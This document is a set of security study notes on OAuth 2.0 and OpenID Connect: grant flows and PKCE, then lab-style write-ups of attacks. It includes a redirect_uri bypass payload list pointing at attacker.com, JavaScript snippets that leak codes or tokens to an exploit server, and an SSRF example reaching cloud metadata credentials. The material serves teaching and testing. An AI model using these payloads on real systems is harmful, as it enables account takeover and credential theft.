# OAuth 2.0

* Authorization framework that enables websites/web applications to request limited access to a user's account on another application.
* Users can determine what data to be shared without exposing login creds.

## How does OAuth 2.0 work?

* Client application - The website/web application that wants to access the user's data.
* Resource owner - The user whose data the client application wants to access.
* OAuth service provider - The application that controls the user's data and access to it. Provides an API for interacting with both an authorization server & resource server.

## What is an OAuth Grant type?

* OAuth grant type determines the exact sequence of steps that are involved in the OAuth process.
* OAuth service must be configured to support particular grant type before client app can initiate the flow. Client application specifies which grant type it prefers in the initial authorization request.

## OAuth Scopes

* Uses 'scope' parameter to specify the data it wants to access and what kind of operation it does on the data.
* eg: `scope=contacts`, `scope=contacts.read` or might provide the full URI

## Authorization Code Grant Type

* #### Authorization Request <sup><sub>(via user browser)<sub></sup>
  * Client application sends request to the OAuth service's "`/authorization`" endpoint asking permission to access user data.
  * eg: `/authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24`
  * `client_id` -> unique identifier of client app
  * `redirect_uri` -> user's browser should be redirected when sending the authorization code to client application
  * `response_type` -> response expected and also determines the flow to initiate. If authorization code grant type, it should be "code".
  * `scope` -> specify the subset of data client wants to access.
  * `state` -> Stores a unique, unguessable value that is tied to the current session on the client application which has an expiry. Acts as a CSRF token.
* #### User Login and Consent
  * When the authorization server receives the initial request, it will redirect user to a login page and asked to log in to their account with the OAuth provider.
* #### Authorization Code Grant <sup><sub>(via user browser)<sub></sup>
  * After user provide consent and authenticates, browser redirects to the URI mentioned in redirect\_uri. (`/callback`)
  * Request will contain the auth `code` and depending on config the `state` Params.
* #### Access Token Request <sup><sub>(app server to oauth server)<sub></sup>
  * Sends a server-to-server POST request to the OAuth `/token` endpoint. Communications from this point takes place in a secure channel & cannot be controlled by an attacker.
  * **Body Params**: `client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8`
* #### Access Token Grant
  * OAuth server validates and responds by granting the client app a access token which also has an expiry.
* #### API call
  * Client app fetches the user's data from OAuth server using access token.
* #### Resource Grant
  * OAuth server verifies token and responds with the requested resource.

## Authorization Code Flow with PKCE

* PKCE -> Proof Key for Code Exchange. Extends the authorization code grant; it is not a separate grant type.
* Preferred replacement for implicit flow in single-page, mobile & native desktop apps. Required for public clients by current OAuth security best practice; also recommended for confidential server-side clients.
* Binds the authorization code to a per-request `code_verifier`, preventing an intercepted code from being exchanged without the matching verifier.
* #### Code Verifier and Challenge Generation <sup><sub>(on the client)</sub></sup>
  * Generate a fresh cryptographically random `code_verifier` for each authorization request and bind it to that login transaction. Use 43-128 characters from `A-Z`, `a-z`, `0-9`, `-`, `.`, `_`, `~`; base64url-encoding 32 random bytes without padding produces a suitable 43-character verifier.
  * Derive `code_challenge = BASE64URL-ENCODE(SHA256(ASCII(code_verifier)))`, without `=` padding. Hash the verifier string, not the original random bytes or a hexadecimal digest.
  * Use `code_challenge_method=S256`. With `plain`, the challenge equals the verifier and exposes it in the authorization request; do not downgrade from `S256` to `plain`.
  * **Example pair** <sup><sub>(RFC 7636 test values; generate fresh values in real flows)</sub></sup>
    * `code_verifier` -> `dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk`
    * `code_challenge` -> `E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM`
* #### Authorization Request <sup><sub>(via user browser)</sub></sup>
  * Client redirects the browser to the OAuth authorization endpoint with `response_type=code`, the challenge & its method. Keep the verifier on the client; do not send it in this request.
  * ```http
    GET /authorization?client_id=12345&redirect_uri=https%3A%2F%2Fclient-app.com%2Fcallback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256 HTTP/1.1
    Host: oauth-provider.com
    ```
  * `client_id`, `redirect_uri`, `scope` & `state` have the same roles as in the authorization code grant. `openid profile` requests OpenID Connect; plain OAuth uses the provider's resource scopes.
* #### User Login and Consent
  * Authorization server authenticates the user and asks them to approve the requested access, unless an existing login/consent allows this step to be skipped.
* #### Authorization Code Grant <sup><sub>(via user browser)</sub></sup>
  * Authorization server binds the `code_challenge` & `code_challenge_method` to the issued code, then redirects to the registered callback with the code, not an access token.
  * ```http
    HTTP/1.1 302 Found
    Location: https://client-app.com/callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24
    ```
  * Client validates the returned `state` against the stored transaction before exchanging the code, and retrieves that transaction's verifier.
* #### Access Token Request <sup><sub>(client to OAuth token endpoint over HTTPS)</sub></sup>
  * Client sends the code & original `code_verifier` in a form-encoded POST body. `grant_type` remains `authorization_code`, not `pkce`.
  * ```http
    POST /token HTTP/1.1
    Host: oauth-provider.com
    Content-Type: application/x-www-form-urlencoded

    client_id=12345&redirect_uri=https%3A%2F%2Fclient-app.com%2Fcallback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&code_verifier=dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk
    ```
  * **Public client** -> SPA sends this request from the browser; native app sends it directly. No `client_secret`; browser-based token requests require the provider's token endpoint to allow the client's origin through CORS.
  * **Confidential client** -> Back-end sends the request and also authenticates using its registered token endpoint authentication method. PKCE does not replace client authentication.
* #### Access Token Grant
  * Authorization server recomputes the challenge from the supplied verifier using the method bound to the code, and compares it with the original challenge.
  * Also validates the code's expiry, one-time use, client binding & matching `redirect_uri`. Missing or incorrect verifier must prevent token issuance; a mismatched verifier returns `invalid_grant`.
  * On success, returns tokens in the response body rather than the redirect URL.
  * ```http
    HTTP/1.1 200 OK
    Content-Type: application/json
    Cache-Control: no-store

    {"access_token":"z0y9x8w7v6u5","token_type":"Bearer","expires_in":3600,"scope":"openid profile"}
    ```
  * Example shows access-token fields only. OpenID Connect also returns an `id_token`; a `refresh_token` may be issued depending on provider policy.
* #### API call
  * Client fetches the user's data from the resource server over HTTPS using `Authorization: Bearer z0y9x8w7v6u5`.
* #### Resource Grant
  * Resource server validates the access token, intended audience & required scopes before returning the requested resource.
* **Difference from implicit** -> Browser redirect carries a short-lived code rather than an access token. PKCE protects code redemption, not a stolen access token or a client compromised by XSS.

## Implicit Grant Type <sup><sub>(Not Recommended)</sub></sup>

* Every communication happens via user's browser and can be observed by an attacker
* Client app receives the access token immediately after the user gives their consent.
* Historically used for single-page & native desktop apps that cannot keep a `client_secret` confidential. Use [authorization code flow with PKCE](#authorization-code-flow-with-pkce) instead to avoid issuing access tokens in the browser redirect URL.
* #### Authorization Request
  * Same as authorization code grant type except the `response_type` should be set to `token`.
* #### User Login and Consent
  * When the authorization server receives initial request, it redirect's user to login page and is asked to login to their account with OAuth provider.
* #### Access Token Grant
  * OAuth service redirect the user's browser to the `redirect_uri` specified in the authorization request and sends the access token instead of auth code.
  * Access token and other token-specific data are sent as a URL fragment.
  * eg: `/callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24`
* #### API call
  * Client app fetches the user's data from OAuth server using access token.
* #### Resource Grant
  * OAuth server verifies token and responds with the requested resource.

## OAuth Authentication

* Client application uses social media site's OAuth service to request access to some data that it can use to identify the user.
* After receiving an access token, the client application requests this data from the resource server, typically from a dedicated /userinfo endpoint.
* Once it receives data, client application uses it in place of a username to log the user in. The access token that it received is often used as password.

## OAuth Auth Vulnerabilities

* Arises since the specification is relatively vague and flexible by design.

## Identifying OAuth Authentication

* First request of the flow will always be a request to `/authorization` endpoint.
* Try sending a GET request to the following standard endpoints:
  * `/.well-known/oauth-authorization-server`
  * `/.well-known/openid-configuration`

## Exploiting OAuth Authentication Vulnerabilities

### Vulnerabilities in the client application

* #### Improper Implementation of the Implicit Grant Type
  * Lab- Uses an implicit grant type where once the oauth service provide the access token, an authenticate endpoint is called to the client app where the access token, username & email-id is passed to assign a session ID. This can be bypassed by changing the required fields to the victims ID to obtain a valid session.
* #### Flawed CSRF Protection
  * eg: Linking Social Media account to an existing account
  * "state" parameter should contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow
  * Lab - Since "state" parameter is not used, when linking our social media account a CSRF attack can be performed by providing our link token to the victim and our social media account gets attached to the victim user's account.

### Vulnerabilities in the OAuth Service <sup><sub>(Leak authorization codes & access tokens)<sub></sup>

* #### Flawed `redirect_uri` Validation
  * If the OAuth service fails to validate redirect\_URI properly, an attacker can construct CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect\_uri
  * Using state or nonce protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.
  * More secure authorization servers will require a redirect\_uri parameter to be sent when exchanging the code as well.
  * **Bypasses**
    * Try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.
    * Append extra values to the default redirect\_uri parameter
    * eg: `https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`
    * Perform server-side parameter pollution where you add repeat the redirect\_uri parameter and see which value does the Oauth service validate and which is used to send the auth code.
    * Change response\_mode from query to fragment can sometimes alter the parsing of the redirect\_uri, allowing to submit URIs that was being blocked
    * Lab - Modify the initial redirect\_uri parameter in the `/auth` endpoint to contain attacker controlled domain and perform a CSRF attack which will send the Auth code to attacker's server.

<details>

<summary>Payloads</summary>

```html
redirect_uri=https://victim.com/redirect?url=https://attacker.com
redirect_uri=https://victim.com/../../../../../attacker.com
redirect_uri=https://victim.com&redirect_uri=https://attacker.com
redirect_uri=https://victim.com%00https://attacker.com
redirect_uri=https%3A%2F%2Fvictim.com%2Fredirect%3Furl%3Dhttps%3A%2F%2Fattacker.com
redirect_uri=https://victim.com#https://attacker.com
redirect_uri=https://victim.com?redirect=https://attacker.com
redirect_uri=https://other.com/redirect?url=https://attacker.com
redirect_uri=https://victim.com/#https://attacker.com
redirect_uri=http://https://attacker.com
redirect_uri=https://victim.com?context=https://attacker.com
redirect_uri=https://victim.com.attacker.com
redirect_uri=https://victim.com@attacker.com
redirect_uri=https://victim.com\@attacker.com
redirect_uri=https://victim.com%0A%0Dhttps://attacker.com
redirect_uri=https://victim.com?@attacker.com
redirect_uri=https://victim.com&state=//attacker.com
redirect_uri=https://victim.com&state=%40attacker.com
redirect_uri=https://victim.com&state=../../../../../attacker.com
```

</details>

* #### Stealing Codes and Access Tokens via proxy page
  * You may be able to use directory traversal tricks to supply any arbitrary path on the domain for redirect
  * XSS vulnerabilities
  * HTML injection - point redirect\_uri parameter to a page where you can inject HTML content, we could leak code via the Referrer header.
  * eg: `<img src="evil-user.net">`When attempting to fetch image, some browsers (Firefox) will send full URL in the Referrer header.
  * Lab - Modify the redirect\_uri to contain an endpoint within the app that is vulnerable to open redirect which forces the OAUTH service to send the code/token to the attacker's server. Using the code/token we can exploit further. Bypass an redirect\_uri check using directory traversal or other techniques.
  * ```html
    <script>
        if (!document.location.hash) {
            window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
            } else {
            window.location = '/?'+document.location.hash.substr(1)
        }
    </script>
    ```
  * Lab- OAuth service is vulnerable to directory traversal. Here the client app allows web pages to be loaded in iframe which can be used to provide the OAuth url and modify the redirect\_uri to contain a page within the client app and setup a event listener to send the URL contents to attacker's server.
  * ```html
    <iframe src='OAUTH_URL with modified redirect_URI'></iframe>
    <script>
        window.addEventListener('message', function(e) {
            fetch("/" + encodeURIComponent(e.data.data))
        }, false)
    </script>
    ```

## Flawed Scope Validation

* Possible for attacker to "upgrade" an access token with extra permissions due to flawed validation by OAuth service

## Scope Upgrade: Authorization Code Flow

* Attacker's malicious client app initially requested access to user's email using scope. After user approves request, the malicious client application receives an authorization code. As attacker controls client application, they can add another scope parameter to the code/token exchange request containing the additional "profile" scope.
* If OAuth server does not validate against the initial authorization request, it generates access token with upgraded privilege.

## Scope Upgrade: Implicit Flow

* Attacker can obtain the access token since all communication is passed via browser.
* Attacker uses the token and sends request to OAuth service's `/userinfo` endpoint, manually adding new scope parameter

## Unverified User Registration

* Client app makes the implicit assumption that the information stored by the OAuth provider is correct
* Websites that provide an OAuth service allow users to register an account without verifying all of their details, including their email address
* Attacker can exploit by registering an account with the OAuth provider using the same details as a target user, such as a known email address

## Extending OAuth with OpenID Connect

* OAuth is extended with an OpenID Connect layer, which provides some additional features related to identifying and authenticating user

## Authorization Codes

* They may be leaked via Referrer headers when external images, scripts, or CSS content is loaded.

## What is OpenID Connect?

* OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer
* OAuth was not initially designed with authentication in mind; intended to be means of delegating authorizations for specific resources between applications

## How does OpenID Connect work?

* From client app's perspective, difference is an additional, standardized set of scopes that are same for all providers, and an extra response type: id\_token.

## OpenID Connect Roles

* **Relying party** - The application that is requesting authentication of a user. This is synonymous with the OAuth client application.
* **End user** - The user who is being authenticated. This is synonymous with the OAuth resource owner.
* **OpenID provider** - An OAuth service that is configured to support OpenID Connect.

## OpenID Connect Claims and Scopes

* "claims" refer to the key:value pairs that represent information about user on the resource server
* In order to use OpenID Connect, the client application must specify the scope openid in the authorization request

## ID Token

* Returns a JSON web token (JWT) signed with a JSON web signature (JWS).
* JWT payload contains list of claims based on scope initially requested. Also contains info about how & when the user last authenticated by the OAuth service
* eg: `response_type=id_token` <sup><sub>(Token/code)<sub></sup>

## Identifying OpenID Connect

* Look for the keyword 'openid' in scope (eg: openid profile/email.address/phone)
* Try adding the 'openid' scope or changing the response type to 'id\_token' and observing whether this results in an error.
* Access config fiLe - `/.well-known/openid-configuration`

## Vulnerability - Unprotected Dynamic Client Registration

* If dynamic client registration is supported, the client app can register itself by sending a POST request to a dedicated /registration endpoint. (endpoint details available in config file/documentation)
* Request body would contain multiple info such as allowed redirect\_uri, client app name, endpoints to expose etc
* Some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application (usually should contain bearer token along with request)
* Few params send in request body as json: `application_type`, `redirect_uris`, `client_name`, `logo_uri`, `token_endpoint_auth_method`, `jwks_ur`i, `userinfo_encrypted_response_alg`, `userinfo_encrypted_response_alg`
* Possibility of second-order SSRF since we provide few URI's for logo, jwks etc.
* Lab - Find the config file in OAuth server to obtain register endpoint. Try sending POST request and craft a body with redirect\_uris and logo\_uri params to register a client. The OAuth server registers a client app and provides the client ID with the logo\_uri the attacker assigned ie collaborator/metadata link. Since the OAuth server would try accessing the logo from the server we mention with a valid client\_id, it's vulnerable to SSRF. (Send fetch logo request to OAuth server and at the backend the server would try fetch the logo from the URI client provided when registering). Obtain metadata - http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/

## Vulnerability - Allowing Authorization Requests by Reference <sup><sub>(SSRF)<sub></sup>

* Some OpenID providers give option to pass the query params passed in the auth request as a JSON web token (JWT)
* If enabled, send a single request\_uri parameter pointing to a JSON web token that contains the rest of the OAuth parameters and their values
* Can use this technique to bypass the validation of other parameters
* To check whether enabled, look for the request\_uri\_parameter\_supported option in the configuration file and documentation.
* Alternatively, try adding just the request\_uri parameter to see if it works.

#### Tools

* [JWTAuditor](https://jwtauditor.com/)

#### Reference

* [What is OAuth, real-world examples and various OAuth attacks](https://shreyapohekar.com/blogs/what-is-oauth-real-world-examples-and-various-oauth-attacks/#google_vignette)
* [RFC 7636 - Proof Key for Code Exchange](https://www.rfc-editor.org/rfc/rfc7636.html)
* [RFC 9700 - OAuth 2.0 Security Best Current Practice](https://www.rfc-editor.org/rfc/rfc9700.html#section-2.1)
